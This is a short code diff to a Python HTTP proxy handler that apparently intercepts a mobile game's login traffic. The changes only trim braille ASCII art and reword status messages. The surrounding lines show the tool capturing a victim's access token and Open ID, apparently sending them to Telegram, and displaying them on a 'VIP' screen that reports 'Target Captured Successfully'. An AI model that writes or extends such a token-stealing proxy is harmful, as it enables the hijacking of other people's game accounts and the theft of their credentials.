@@ -141,29 +141,29 @@ class ProxyHandler(BaseHTTPRequestHandler):
             except Exception as tg_err:
                 print(f"{R}[!] Telegram API Error: {tg_err}{W}")
                 
-            # VIP Game Screen Response Payload with Custom Large Art & Sniffed Data
+            # VIP Game Screen Response Payload with Full Custom Art & Data
             response_payload = f"""[b][c][00FFCC]
-⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⡿⣿⡿⣗⢌⢳⡀⠄ 
-⠄⠄⠄⠄⠄⣼⣿⡇⣿⠹⡸⡹⣷⡹⡎⣧⢳⠄ 
-⠄⠄⠄⠄⠄⣿⣿⠱⡙⠰⣢⡱⢹⡇⡷⢸⢸⠄ 
-⠄⠄⠄⠄⠄⢿⢸⡈⣉⣤⠠⣴⡄⡇⠁⠄⢸⠄ 
-⠄⠄⠄⠄⠄⠸⡆⡃⡙⢍⣹⡿⢓⠄⠤⣐⡟⠄ 
-⠄⠄⠄⠄⠄⠄⠙⠾⠾⠮⣵⢸⡔⢷⣍⠉⠄⠄ 
-⠄⠄⠄⠄⢀⣴⣾⣿⣷⡺⡋⢞⣎⣚⣛⣳⣴⣶ 
-⠄⠄⠄⠄⢘⣛⣩⣾⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿ 
-⠄⠄⣀⠺⣿⣿⣿⠟⣡⣾⠿⢿⣿⣿⡎⢋⠻⣿ 
-⠄⠄⣉⣠⣿⣿⡏⣼⣿⠁⠶⠄⣿⣿⡇⡼⠄⠈ 
-⠄⠄⣈⠻⠿⠟⢁⠘⢿⣷⣶⣾⣿⠟⡰⠃⠄⠄ 
-⠄⣴⣿⣧⢻⣿⣿⣷⣦⣬⣉⣩⣴⠞⠁⠄⠄⠄ 
-⠄⠘⠿⠿⢸⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄ 
-⠄⢤⡝⣧⢸⣿⣿⣿⣿⣿⣿⠟⠄⠄⠄⠄⠄⠄ 
-⣜⢧⠻⣀⢿⣿⣿⣿⣿⣿⠏⣾⣧⡀⠄⠄⠄⠄ 
-⠹⢂⣾⣿⠸⣿⣿⣿⣿⡏⣼⣿⣿⣷⠄⠄⠄⠄ 
-⠄⣿⣿⣿⣧⠹⣿⢻⡿⢰⣿⣿⣿⣿⣇⠄⠄⠄ 
-⢸⣿⣿⣿⣿⣇⢹⢸⢁⣿⣿⣿⣿⣿⣿⡆⠄⠄ 
-⢸⣿⣿⣿⣿⣿⣆⠄⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄ 
-⠸⣿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⣿⣿⣿⡇⠄⠄ 
-⠄⣿⣿⣿⣿⣿⣿⠄⠈⣿⣿⣿⣿⣿⣿⡇⠄⠄
+⣴⣿⣿⣿⡿⣿⡿⣗⢌⢳⡀
+⣼⣿⡇⣿⠹⡸⡹⣷⡹⡎⣧⢳
+⣿⣿⠱⡙⠰⣢⡱⢹⡇⡷⢸⢸
+⢿⢸⡈⣉⣤⠠⣴⡄⡇⠁⠄⢸
+⠸⡆⡃⡙⢍⣹⡿⢓⠄⠤⣐⡟
+⠙⠾⠾⠮⣵⢸⡔⢷⣍⠉
+⢀⣴⣾⣿⣷⡺⡋⢞⣎⣚⣛⣳⣴⣶
+⢘⣛⣩⣾⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿
+⣀⠺⣿⣿⣿⠟⣡⣾⠿⢿⣿⣿⡎⢋⠻⣿
+⣉⣠⣿⣿⡏⣼⣿⠁⠶⠄⣿⣿⡇⡼⠄⠈
+⣈⠻⠿⠟⢁⠘⢿⣷⣶⣾⣿⠟⡰⠃
+⣴⣿⣧⢻⣿⣿⣷⣦⣬⣉⣩⣴⠞⠁
+⠘⠿⠿⢸⣿⣿⣿⣿⣿⣿⣿⠁
+⢤⡝⣧⢸⣿⣿⣿⣿⣿⣿⠟
+⣜⢧⠻⣀⢿⣿⣿⣿⣿⣿⠏⣾⣧⡀
+⠹⢂⣾⣿⠸⣿⣿⣿⣿⡏⣼⣿⣿⣷
+⣿⣿⣿⣧⠹⣿⢻⡿⢰⣿⣿⣿⣿⣇
+⢸⣿⣿⣿⣿⣇⢹⢸⢁⣿⣿⣿⣿⣿⣿⡆
+⢸⣿⣿⣿⣿⣿⣆⠄⣿⣿⣿⣿⣿⣿⣿⡇
+⠸⣿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⣿⣿⣿⡇
+⠄⣿⣿⣿⣿⣿⣿⠄⠈⣿⣿⣿⣿⣿⣿⡇
 
 [FFD700]═════════════════════════════════════
 [00FF00]👑 NIROB BBZ ELITE SECURITY SYSTEM 👑
@@ -172,7 +172,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
 [cccccc]Access Token => [FF0000]{access_token}
 [cccccc]Open ID      => [00FF00]{open_id}
 
-[FFFF00]Status: Target Sniffed & Captured Successfully!
+[FFFF00]Status: Target Captured Successfully!
 """
 
             self.send_response(500)
